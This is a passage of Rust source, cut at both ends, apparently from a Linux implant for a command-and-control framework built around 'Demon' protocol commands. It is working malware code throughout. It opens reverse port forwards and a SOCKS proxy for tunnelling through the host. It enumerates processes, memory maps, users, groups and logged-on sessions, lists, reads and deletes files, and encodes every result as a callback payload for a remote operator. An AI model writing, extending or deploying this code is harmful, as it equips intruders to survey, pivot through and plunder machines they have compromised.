    forward_port: u32,
    command: DemonSocketCommand,
) -> Result<(), PhantomError> {
    let listener_id = state.allocate_socket_id();
    let bind_socket = SocketAddrV4::new(Ipv4Addr::from(bind_addr), bind_port as u16);
    match TcpListener::bind(bind_socket) {
        Ok(listener) => {
            listener
                .set_nonblocking(true)
                .map_err(|error| PhantomError::Socket(error.to_string()))?;
            let bound_port =
                listener.local_addr().map(|addr| u32::from(addr.port())).unwrap_or(bind_port);
            state.reverse_port_forwards.insert(
                listener_id,
                ReversePortForward {
                    listener,
                    mode,
                    bind_addr,
                    bind_port: bound_port,
                    forward_addr,
                    forward_port,
                },
            );
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_port_forward_add(
                    command,
                    true,
                    listener_id,
                    bind_addr,
                    bound_port,
                    forward_addr,
                    forward_port,
                ),
            });
        }
        Err(_error) => {
            state.queue_callback(PendingCallback::Socket {
                request_id,
                payload: encode_port_forward_add(
                    command,
                    false,
                    0,
                    bind_addr,
                    bind_port,
                    forward_addr,
                    forward_port,
                ),
            });
        }
    }
    Ok(())
}

async fn connect_socks_target(atyp: u8, host: &[u8], port: u16) -> Result<TcpStream, u32> {
    let target = match atyp {
        1 if host.len() == 4 => format!("{}.{}.{}.{}:{port}", host[0], host[1], host[2], host[3]),
        3 => {
            let hostname = String::from_utf8(host.to_vec()).map_err(|_| 1_u32)?;
            format!("{hostname}:{port}")
        }
        4 if host.len() == 16 => {
            let segments = host
                .chunks_exact(2)
                .map(|chunk| u16::from_be_bytes([chunk[0], chunk[1]]))
                .collect::<Vec<_>>();
            format!(
                "{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{:x}:{port}",
                segments[0],
                segments[1],
                segments[2],
                segments[3],
                segments[4],
                segments[5],
                segments[6],
                segments[7],
            )
        }
        _ => return Err(1),
    };

    let stream =
        TokioTcpStream::connect(&target).await.map_err(|error| raw_socket_error(&error))?;
    let stream = stream.into_std().map_err(|error| raw_socket_error(&error))?;
    stream.set_nonblocking(true).map_err(|error| raw_socket_error(&error))?;
    Ok(stream)
}

async fn connect_ipv4_target(addr: u32, port: u16) -> Result<TcpStream, u32> {
    let octets = Ipv4Addr::from(addr).octets();
    connect_socks_target(1, &octets, port).await
}

fn read_available(stream: &mut TcpStream, buffer: &mut Vec<u8>) -> Result<bool, PhantomError> {
    let mut chunk = [0_u8; 4096];
    loop {
        match stream.read(&mut chunk) {
            Ok(0) => return Ok(true),
            Ok(read) => buffer.extend_from_slice(&chunk[..read]),
            Err(error) if error.kind() == ErrorKind::WouldBlock => return Ok(false),
            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
            Err(error) => return Err(PhantomError::Socket(error.to_string())),
        }
    }
}

fn pump_stream(source: &mut TcpStream, sink: &mut TcpStream) -> bool {
    let mut buffer = [0_u8; 4096];
    loop {
        match source.read(&mut buffer) {
            Ok(0) => return true,
            Ok(read) => {
                if write_all_nonblocking(sink, &buffer[..read]).is_err() {
                    return true;
                }
            }
            Err(error) if error.kind() == ErrorKind::WouldBlock => return false,
            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
            Err(_) => return true,
        }
    }
}

fn try_parse_socks_greeting(buffer: &[u8]) -> Option<Result<usize, u8>> {
    if buffer.len() < 2 {
        return None;
    }
    if buffer[0] != SOCKS_VERSION {
        return Some(Err(SOCKS_METHOD_NOT_ACCEPTABLE));
    }
    let total = 2 + usize::from(buffer[1]);
    if buffer.len() < total {
        return None;
    }
    if !buffer[2..total].contains(&SOCKS_METHOD_NO_AUTH) {
        return Some(Err(SOCKS_METHOD_NOT_ACCEPTABLE));
    }
    Some(Ok(total))
}

fn try_parse_socks_request(
    buffer: &[u8],
) -> Option<Result<(usize, SocksConnectRequest), SocksRequestError>> {
    if buffer.len() < 4 {
        return None;
    }
    if buffer[0] != SOCKS_VERSION {
        return Some(Err(SocksRequestError::GeneralFailure));
    }
    if buffer[1] != SOCKS_COMMAND_CONNECT {
        return Some(Err(SocksRequestError::CommandNotSupported));
    }

    let atyp = buffer[3];
    let address_len = match atyp {
        1 => 4,
        3 => {
            if buffer.len() < 5 {
                return None;
            }
            usize::from(buffer[4]) + 1
        }
        4 => 16,
        _ => return Some(Err(SocksRequestError::AddressTypeNotSupported)),
    };

    let header_len = 4 + address_len;
    if buffer.len() < header_len + 2 {
        return None;
    }

    let address = match atyp {
        3 => buffer[5..header_len].to_vec(),
        _ => buffer[4..header_len].to_vec(),
    };
    let port = u16::from_be_bytes([buffer[header_len], buffer[header_len + 1]]);
    Some(Ok((header_len + 2, SocksConnectRequest { atyp, address, port })))
}

fn send_socks_reply(
    stream: &mut TcpStream,
    reply: u8,
    atyp: u8,
    address: &[u8],
    port: u16,
) -> Result<(), PhantomError> {
    let mut response = vec![SOCKS_VERSION, reply, 0, atyp];
    match atyp {
        3 => {
            let length = u8::try_from(address.len())
                .map_err(|_| PhantomError::Socket(String::from("SOCKS domain too long")))?;
            response.push(length);
            response.extend_from_slice(address);
        }
        _ => response.extend_from_slice(address),
    }
    response.extend_from_slice(&port.to_be_bytes());
    write_all_nonblocking(stream, &response)
        .map_err(|error| PhantomError::Socket(error.to_string()))
}

fn write_all_nonblocking(stream: &mut TcpStream, mut data: &[u8]) -> std::io::Result<()> {
    while !data.is_empty() {
        match stream.write(data) {
            Ok(0) => return Err(std::io::Error::new(ErrorKind::WriteZero, "socket closed")),
            Ok(written) => data = &data[written..],
            Err(error) if error.kind() == ErrorKind::Interrupted => continue,
            Err(error) => return Err(error),
        }
    }

    Ok(())
}

fn raw_socket_error(error: &std::io::Error) -> u32 {
    error.raw_os_error().and_then(|code| u32::try_from(code).ok()).unwrap_or(1)
}

fn enumerate_processes() -> Result<Vec<ProcessEntry>, PhantomError> {
    let mut processes = Vec::new();
    for entry in fs::read_dir("/proc").map_err(|error| io_error("/proc", error))? {
        let entry = entry.map_err(|error| io_error("/proc", error))?;
        let file_name = entry.file_name();
        let Some(pid) = file_name.to_str().and_then(|value| value.parse::<u32>().ok()) else {
            continue;
        };
        match read_process_entry(pid) {
            Ok(process) => processes.push(process),
            Err(PhantomError::Io { message, .. })
                if message.contains("No such file or directory") =>
            {
                continue;
            }
            Err(error) => return Err(error),
        }
    }
    processes.sort_by(|left, right| left.pid.cmp(&right.pid));
    Ok(processes)
}

fn read_process_entry(pid: u32) -> Result<ProcessEntry, PhantomError> {
    let proc_path = PathBuf::from(format!("/proc/{pid}"));
    let status = fs::read_to_string(proc_path.join("status"))
        .map_err(|error| io_error(proc_path.join("status"), error))?;
    let metadata = fs::metadata(&proc_path).map_err(|error| io_error(&proc_path, error))?;
    let name = status_field(&status, "Name").map(str::to_owned).unwrap_or_else(|| pid.to_string());
    let parent_pid = status_field(&status, "PPid")
        .and_then(|value| value.parse::<u32>().ok())
        .unwrap_or_default();
    let threads =
        status_field(&status, "Threads").and_then(|value| value.parse::<u32>().ok()).unwrap_or(1);
    let session = read_process_session(pid).unwrap_or_default();
    let exe = fs::read_link(proc_path.join("exe")).unwrap_or_else(|_| PathBuf::from(&name));
    let is_wow64 = process_arch_bits(&exe).unwrap_or(64) == 32;

    Ok(ProcessEntry {
        name: executable_name(&exe),
        pid,
        parent_pid,
        session,
        threads,
        user: username_for_uid(metadata.uid()),
        is_wow64,
    })
}

fn status_field<'a>(status: &'a str, field: &str) -> Option<&'a str> {
    status.lines().find_map(|line| {
        line.strip_prefix(field).and_then(|value| value.strip_prefix(':')).map(str::trim)
    })
}

fn read_process_session(pid: u32) -> Option<u32> {
    let stat = fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
    let suffix = stat.split_once(") ")?.1;
    let fields = suffix.split_whitespace().collect::<Vec<_>>();
    fields.get(3)?.parse::<u32>().ok()
}

fn process_arch_bits(exe: &Path) -> Option<u32> {
    let header = fs::read(exe).ok()?;
    if header.len() < 5 || &header[..4] != b"\x7FELF" {
        return None;
    }
    match header[4] {
        1 => Some(32),
        2 => Some(64),
        _ => None,
    }
}

fn username_for_uid(uid: u32) -> String {
    fs::read_to_string("/etc/passwd")
        .ok()
        .and_then(|passwd| {
            passwd.lines().find_map(|line| {
                let mut fields = line.split(':');
                let username = fields.next()?;
                let _password = fields.next()?;
                let entry_uid = fields.next()?.parse::<u32>().ok()?;
                (entry_uid == uid).then(|| username.to_string())
            })
        })
        .unwrap_or_else(|| uid.to_string())
}

fn enumerate_modules(pid: u32) -> Result<Vec<(String, u64)>, PhantomError> {
    let maps_path = if pid == 0 {
        PathBuf::from("/proc/self/maps")
    } else {
        PathBuf::from(format!("/proc/{pid}/maps"))
    };
    let contents = fs::read_to_string(&maps_path).map_err(|error| io_error(&maps_path, error))?;
    let mut modules = BTreeMap::new();
    for line in contents.lines() {
        let mut parts = line.split_whitespace();
        let Some(range) = parts.next() else {
            continue;
        };
        let path = parts.nth(4).unwrap_or_default();
        if path.is_empty() || !path.starts_with('/') {
            continue;
        }
        let Some((base, _)) = range.split_once('-') else {
            continue;
        };
        let Ok(base_addr) = u64::from_str_radix(base, 16) else {
            continue;
        };
        modules.entry(path.to_string()).or_insert(base_addr);
    }
    Ok(modules.into_iter().collect())
}

fn linux_domain_name() -> String {
    fs::read_to_string("/etc/resolv.conf")
        .ok()
        .and_then(|contents| {
            contents.lines().find_map(|line| {
                let trimmed = line.trim();
                trimmed
                    .strip_prefix("search ")
                    .or_else(|| trimmed.strip_prefix("domain "))
                    .map(|value| value.trim().to_string())
            })
        })
        .unwrap_or_default()
}

fn local_hostname() -> String {
    fs::read_to_string("/etc/hostname")
        .ok()
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
        .or_else(|| std::env::var("HOSTNAME").ok().filter(|value| !value.is_empty()))
        .unwrap_or_else(|| String::from("localhost"))
}

fn default_net_target(value: &str) -> String {
    if value.is_empty() { local_hostname() } else { value.to_string() }
}

fn compatible_computer_list(target: &str) -> Vec<String> {
    let hostname = local_hostname();
    (target.eq_ignore_ascii_case(&hostname)
        || target == "."
        || target.eq_ignore_ascii_case("localhost"))
    .then_some(hostname)
    .into_iter()
    .collect()
}

fn compatible_dc_list(target: &str) -> Vec<String> {
    let domain = linux_domain_name();
    if domain.is_empty() || !target.eq_ignore_ascii_case(&domain) {
        return Vec::new();
    }
    vec![local_hostname()]
}

fn compatible_share_list() -> Vec<ShareEntry> {
    Vec::new()
}

fn logged_on_users() -> Vec<String> {
    parse_logged_on_users(&run_who())
}

fn logged_on_sessions() -> Vec<SessionEntry> {
    parse_logged_on_sessions(&run_who())
}

fn run_who() -> String {
    match std::process::Command::new("who").output() {
        Ok(output) if output.status.success() => {
            String::from_utf8_lossy(&output.stdout).into_owned()
        }
        _ => String::new(),
    }
}

fn parse_logged_on_users(output: &str) -> Vec<String> {
    let mut users = output
        .lines()
        .filter_map(|line| line.split_whitespace().next().map(str::to_string))
        .collect::<Vec<_>>();
    users.sort();
    users.dedup();
    users
}

fn parse_logged_on_sessions(output: &str) -> Vec<SessionEntry> {
    output
        .lines()
        .filter_map(|line| {
            let parts = line.split_whitespace().collect::<Vec<_>>();
            let user = parts.first()?.to_string();
            let fallback_client = parts.get(1).copied().unwrap_or_default().to_string();
            let client = line
                .rsplit_once('(')
                .and_then(|(_, suffix)| suffix.strip_suffix(')'))
                .map(str::trim)
                .filter(|value| !value.is_empty())
                .unwrap_or(&fallback_client)
                .to_string();
            Some(SessionEntry { client, user, active: 0, idle: 0 })
        })
        .collect()
}

fn enumerate_groups() -> Result<Vec<GroupEntry>, PhantomError> {
    let contents =
        fs::read_to_string("/etc/group").map_err(|error| io_error("/etc/group", error))?;
    Ok(parse_group_entries(&contents))
}

fn parse_group_entries(contents: &str) -> Vec<GroupEntry> {
    let mut groups = contents
        .lines()
        .filter(|line| !line.trim().is_empty() && !line.starts_with('#'))
        .filter_map(|line| {
            let mut fields = line.split(':');
            let name = fields.next()?.trim();
            let _password = fields.next()?;
            let gid = fields.next()?.trim();
            let members = fields.next().unwrap_or_default().trim();
            let description = if members.is_empty() {
                format!("gid={gid}")
            } else {
                format!("gid={gid}; members={members}")
            };
            Some(GroupEntry { name: name.to_string(), description })
        })
        .collect::<Vec<_>>();
    groups.sort_by(|left, right| left.name.cmp(&right.name));
    groups
}

fn enumerate_users() -> Result<Vec<UserEntry>, PhantomError> {
    let contents =
        fs::read_to_string("/etc/passwd").map_err(|error| io_error("/etc/passwd", error))?;
    Ok(parse_user_entries(&contents))
}

fn parse_user_entries(contents: &str) -> Vec<UserEntry> {
    let mut users = contents
        .lines()
        .filter(|line| !line.trim().is_empty() && !line.starts_with('#'))
        .filter_map(|line| {
            let mut fields = line.split(':');
            let name = fields.next()?.trim();
            let _password = fields.next()?;
            let uid = fields.next()?.trim().parse::<u32>().ok()?;
            Some(UserEntry { name: name.to_string(), is_admin: uid == 0 })
        })
        .collect::<Vec<_>>();
    users.sort_by(|left, right| left.name.cmp(&right.name));
    users
}

fn enumerate_memory_regions(
    pid: u32,
    query_protection: u32,
) -> Result<Vec<MemoryRegion>, PhantomError> {
    let maps_path = if pid == 0 {
        PathBuf::from("/proc/self/maps")
    } else {
        PathBuf::from(format!("/proc/{pid}/maps"))
    };
    let contents = fs::read_to_string(&maps_path).map_err(|error| io_error(&maps_path, error))?;
    let mut regions = contents
        .lines()
        .filter_map(parse_memory_region)
        .filter(|region| query_protection == 0 || region.protect == query_protection)
        .collect::<Vec<_>>();
    regions.sort_by(|left, right| left.base.cmp(&right.base));
    Ok(regions)
}

fn parse_memory_region(line: &str) -> Option<MemoryRegion> {
    let fields = line.split_whitespace().collect::<Vec<_>>();
    let range = *fields.first()?;
    let perms = *fields.get(1)?;
    let path = fields.get(5).copied();
    let (start, end) = range.split_once('-')?;
    let base = u64::from_str_radix(start, 16).ok()?;
    let end = u64::from_str_radix(end, 16).ok()?;
    let size = u32::try_from(end.checked_sub(base)?).ok()?;
    let protect = map_linux_protection(perms);
    let mem_type = map_linux_memory_type(perms, path);
    Some(MemoryRegion { base, size, protect, state: MEM_COMMIT, mem_type })
}

fn map_linux_protection(perms: &str) -> u32 {
    match perms.as_bytes() {
        [b'-', b'-', b'-', b'-', ..] => PAGE_NOACCESS,
        [b'r', b'-', b'-', b'-', ..] => PAGE_READONLY,
        [b'r', b'w', b'-', b'p', ..] => PAGE_READWRITE,
        [b'r', b'w', b'-', b's', ..] => PAGE_WRITECOPY,
        [b'-', b'-', b'x', b'-', ..] => PAGE_EXECUTE,
        [b'r', b'-', b'x', b'p', ..] | [b'r', b'-', b'x', b's', ..] => PAGE_EXECUTE_READ,
        [b'r', b'w', b'x', b'p', ..] => PAGE_EXECUTE_READWRITE,
        [b'r', b'w', b'x', b's', ..] => PAGE_EXECUTE_WRITECOPY,
        [b'-', b'w', b'-', b'p', ..] | [b'-', b'w', b'-', b's', ..] => PAGE_READWRITE,
        [b'-', b'w', b'x', b'p', ..] => PAGE_EXECUTE_READWRITE,
        [b'-', b'w', b'x', b's', ..] => PAGE_EXECUTE_WRITECOPY,
        [b'-', b'-', b'x', b'p', ..] | [b'-', b'-', b'x', b's', ..] => PAGE_EXECUTE,
        _ => PAGE_NOACCESS,
    }
}

fn map_linux_memory_type(perms: &str, path: Option<&str>) -> u32 {
    match path {
        Some(path) if path.starts_with('/') => {
            if perms.contains('x') {
                MEM_IMAGE
            } else {
                MEM_MAPPED
            }
        }
        _ => MEM_PRIVATE,
    }
}

fn normalize_path(value: &str) -> PathBuf {
    if value.is_empty() || value == "." {
        std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
    } else {
        PathBuf::from(value)
    }
}

fn io_error(path: impl AsRef<Path>, error: std::io::Error) -> PhantomError {
    PhantomError::Io { path: path.as_ref().to_path_buf(), message: error.to_string() }
}

fn split_args(arguments: &str) -> Vec<OsString> {
    arguments.split_whitespace().filter(|value| !value.is_empty()).map(OsString::from).collect()
}

fn encode_process_list(
    process_ui: u32,
    processes: &[ProcessEntry],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(process_ui);
    for process in processes {
        payload.extend_from_slice(&encode_utf16(&process.name)?);
        payload.extend_from_slice(&encode_u32(process.pid));
        payload.extend_from_slice(&encode_bool(process.is_wow64));
        payload.extend_from_slice(&encode_u32(process.parent_pid));
        payload.extend_from_slice(&encode_u32(process.session));
        payload.extend_from_slice(&encode_u32(process.threads));
        payload.extend_from_slice(&encode_utf16(&process.user)?);
    }
    Ok(payload)
}

fn encode_proc_create(
    path: &str,
    pid: u32,
    success: bool,
    piped: bool,
    verbose: bool,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Create));
    payload.extend_from_slice(&encode_utf16(path)?);
    payload.extend_from_slice(&encode_u32(pid));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_bool(piped));
    payload.extend_from_slice(&encode_bool(verbose));
    Ok(payload)
}

fn encode_proc_kill(success: bool, pid: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Kill));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(pid));
    payload
}

fn encode_proc_grep(processes: &[ProcessEntry]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Grep));
    for process in processes {
        payload.extend_from_slice(&encode_utf16(&process.name)?);
        payload.extend_from_slice(&encode_u32(process.pid));
        payload.extend_from_slice(&encode_u32(process.parent_pid));
        payload.extend_from_slice(&encode_utf16(&process.user)?);
        payload.extend_from_slice(&encode_u32(if process.is_wow64 { 86 } else { 64 }));
    }
    Ok(payload)
}

fn encode_proc_modules(pid: u32, modules: &[(String, u64)]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Modules));
    payload.extend_from_slice(&encode_u32(pid));
    for (name, base) in modules {
        payload.extend_from_slice(&encode_bytes(name.as_bytes())?);
        payload.extend_from_slice(&encode_u64(*base));
    }
    Ok(payload)
}

fn encode_proc_memory(pid: u32, query_protection: u32, regions: &[MemoryRegion]) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonProcessCommand::Memory));
    payload.extend_from_slice(&encode_u32(pid));
    payload.extend_from_slice(&encode_u32(query_protection));
    for region in regions {
        payload.extend_from_slice(&encode_u64(region.base));
        payload.extend_from_slice(&encode_u32(region.size));
        payload.extend_from_slice(&encode_u32(region.protect));
        payload.extend_from_slice(&encode_u32(region.state));
        payload.extend_from_slice(&encode_u32(region.mem_type));
    }
    payload
}

fn encode_net_domain(domain: &str) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Domain));
    payload.extend_from_slice(&encode_bytes(domain.as_bytes())?);
    Ok(payload)
}

fn encode_net_name_list(
    subcommand: DemonNetCommand,
    target: &str,
    names: &[String],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_utf16(target)?);
    for name in names {
        payload.extend_from_slice(&encode_utf16(name)?);
    }
    Ok(payload)
}

fn encode_net_logons(target: &str, users: &[String]) -> Result<Vec<u8>, PhantomError> {
    encode_net_name_list(DemonNetCommand::Logons, target, users)
}

fn encode_net_sessions(target: &str, sessions: &[SessionEntry]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Sessions));
    payload.extend_from_slice(&encode_utf16(target)?);
    for session in sessions {
        payload.extend_from_slice(&encode_utf16(&session.client)?);
        payload.extend_from_slice(&encode_utf16(&session.user)?);
        payload.extend_from_slice(&encode_u32(session.active));
        payload.extend_from_slice(&encode_u32(session.idle));
    }
    Ok(payload)
}

fn encode_net_shares(target: &str, shares: &[ShareEntry]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Share));
    payload.extend_from_slice(&encode_utf16(target)?);
    for share in shares {
        payload.extend_from_slice(&encode_utf16(&share.name)?);
        payload.extend_from_slice(&encode_utf16(&share.path)?);
        payload.extend_from_slice(&encode_utf16(&share.remark)?);
        payload.extend_from_slice(&encode_u32(share.access));
    }
    Ok(payload)
}

fn encode_net_groups(
    subcommand: DemonNetCommand,
    target: &str,
    groups: &[GroupEntry],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_utf16(target)?);
    for group in groups {
        payload.extend_from_slice(&encode_utf16(&group.name)?);
        payload.extend_from_slice(&encode_utf16(&group.description)?);
    }
    Ok(payload)
}

fn encode_net_users(target: &str, users: &[UserEntry]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonNetCommand::Users));
    payload.extend_from_slice(&encode_utf16(target)?);
    for user in users {
        payload.extend_from_slice(&encode_utf16(&user.name)?);
        payload.extend_from_slice(&encode_bool(user.is_admin));
    }
    Ok(payload)
}

fn encode_fs_dir_listing(
    target: &Path,
    subdirs: bool,
    files_only: bool,
    dirs_only: bool,
    list_only: bool,
) -> Result<Vec<u8>, PhantomError> {
    let start_path = directory_root_path(target);
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Dir));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_bool(list_only));
    payload.extend_from_slice(&encode_utf16(&start_path)?);

    let listings = collect_directory_listings(target, subdirs, files_only, dirs_only)?;
    payload.extend_from_slice(&encode_bool(true));
    for listing in listings {
        let files = listing.entries.iter().filter(|entry| !entry.is_dir).count() as u32;
        let dirs = listing.entries.iter().filter(|entry| entry.is_dir).count() as u32;
        let total_size = listing
            .entries
            .iter()
            .filter(|entry| !entry.is_dir)
            .map(|entry| entry.size)
            .sum::<u64>();

        payload.extend_from_slice(&encode_utf16(&listing.root_path)?);
        payload.extend_from_slice(&encode_u32(files));
        payload.extend_from_slice(&encode_u32(dirs));
        if !list_only {
            payload.extend_from_slice(&encode_u64(total_size));
        }

        for entry in listing.entries {
            payload.extend_from_slice(&encode_utf16(&entry.name)?);
            if !list_only {
                payload.extend_from_slice(&encode_bool(entry.is_dir));
                payload.extend_from_slice(&encode_u64(entry.size));
                payload.extend_from_slice(&encode_u32(entry.modified.day));
                payload.extend_from_slice(&encode_u32(entry.modified.month));
                payload.extend_from_slice(&encode_u32(entry.modified.year));
                payload.extend_from_slice(&encode_u32(entry.modified.minute));
                payload.extend_from_slice(&encode_u32(entry.modified.hour));
            }
        }
    }

    Ok(payload)
}

fn collect_directory_listings(
    target: &Path,
    subdirs: bool,
    files_only: bool,
    dirs_only: bool,
) -> Result<Vec<FilesystemListing>, PhantomError> {
    let mut listings = Vec::new();
    let mut pending = vec![target.to_path_buf()];
    while let Some(root) = pending.pop() {
        let mut entries = Vec::new();
        let read_dir = match fs::read_dir(&root) {
            Ok(read_dir) => read_dir,
            // Directory vanished between being queued and being read (TOCTOU).
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
            Err(error) => return Err(io_error(&root, error)),
        };
        for entry in read_dir {
            let entry = match entry {
                Ok(entry) => entry,
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
                Err(error) => return Err(io_error(&root, error)),
            };
            let path = entry.path();
            let metadata = match entry.metadata() {
                Ok(metadata) => metadata,
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
                Err(error) => return Err(io_error(&path, error)),
            };
            if metadata.is_dir() && subdirs {
                pending.push(path.clone());
            }
            if files_only && metadata.is_dir() {
                continue;
            }
            if dirs_only && metadata.is_file() {
                continue;
            }
            entries.push(FilesystemEntry {
                name: entry.file_name().to_string_lossy().into_owned(),
                is_dir: metadata.is_dir(),
                size: metadata.len(),
                modified: modified_time(metadata.modified().ok()),
            });
        }
        entries.sort_by(|left, right| left.name.cmp(&right.name));
        listings.push(FilesystemListing { root_path: directory_root_path(&root), entries });
    }
    listings.sort_by(|left, right| left.root_path.cmp(&right.root_path));
    Ok(listings)
}

fn modified_time(timestamp: Option<SystemTime>) -> ModifiedTime {
    let unix_timestamp = timestamp
        .and_then(|time| time.duration_since(UNIX_EPOCH).ok())
        .map(|duration| duration.as_secs() as i64)
        .unwrap_or_default();
    let datetime =
        OffsetDateTime::from_unix_timestamp(unix_timestamp).unwrap_or(OffsetDateTime::UNIX_EPOCH);
    ModifiedTime {
        day: datetime.day().into(),
        month: u8::from(datetime.month()).into(),
        year: u32::try_from(datetime.year()).unwrap_or_default(),
        minute: datetime.minute().into(),
        hour: datetime.hour().into(),
    }
}

fn directory_root_path(path: &Path) -> String {
    let display = path.display().to_string();
    if display.ends_with('/') { display } else { format!("{display}/") }
}

fn encode_fs_cat(path: &Path, contents: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Cat));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    payload.extend_from_slice(&encode_bool(true));
    payload.extend_from_slice(&encode_bytes(contents)?);
    Ok(payload)
}

fn encode_fs_path_only(
    subcommand: DemonFilesystemCommand,
    path: &Path,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    Ok(payload)
}

fn encode_fs_remove(path: &Path, is_dir: bool) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Remove));
    payload.extend_from_slice(&encode_bool(is_dir));
    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
    Ok(payload)
}

fn encode_fs_copy_move(
    subcommand: DemonFilesystemCommand,
    success: bool,
    from: &Path,
    to: &Path,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(subcommand));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_utf16(&from.display().to_string())?);
    payload.extend_from_slice(&encode_utf16(&to.display().to_string())?);
    Ok(payload)
}

fn encode_u32(value: u32) -> Vec<u8> {
    value.to_le_bytes().to_vec()
}

fn encode_u64(value: u64) -> Vec<u8> {
    value.to_le_bytes().to_vec()
}

fn encode_bool(value: bool) -> Vec<u8> {
    encode_u32(u32::from(value))
}

fn encode_bytes(value: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let len = u32::try_from(value.len())
        .map_err(|_| PhantomError::InvalidResponse("socket payload too large"))?;
    let mut out = Vec::with_capacity(4 + value.len());
    out.extend_from_slice(&len.to_le_bytes());
    out.extend_from_slice(value);
    Ok(out)
}

fn encode_utf16(value: &str) -> Result<Vec<u8>, PhantomError> {
    let encoded = value.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<_>>();
    encode_bytes(&encoded)
}

fn encode_port_forward_add(
    command: DemonSocketCommand,
    success: bool,
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(command));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_open(
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
    forward_addr: u32,
    forward_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Open));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(bind_addr));
    payload.extend_from_slice(&encode_u32(bind_port));
    payload.extend_from_slice(&encode_u32(forward_addr));
    payload.extend_from_slice(&encode_u32(forward_port));
    payload
}

fn encode_socket_read_success(
    socket_id: u32,
    socket_type: DemonSocketType,
    data: &[u8],
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(true));
    payload.extend_from_slice(&encode_bytes(data)?);
    Ok(payload)
}

fn encode_socket_read_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Read));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socket_write_failure(
    socket_id: u32,
    socket_type: DemonSocketType,
    error_code: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Write));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload.extend_from_slice(&encode_bool(false));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socket_close(socket_id: u32, socket_type: DemonSocketType) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Close));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(u32::from(socket_type)));
    payload
}

fn encode_socket_connect(success: bool, socket_id: u32, error_code: u32) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::Connect));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
    payload.extend_from_slice(&encode_u32(error_code));
    payload
}

fn encode_socks_proxy_add(
    success: bool,
    socket_id: u32,
    bind_addr: u32,
    bind_port: u32,
) -> Vec<u8> {
    let mut payload = encode_u32(u32::from(DemonSocketCommand::SocksProxyAdd));
    payload.extend_from_slice(&encode_bool(success));
    payload.extend_from_slice(&encode_u32(socket_id));
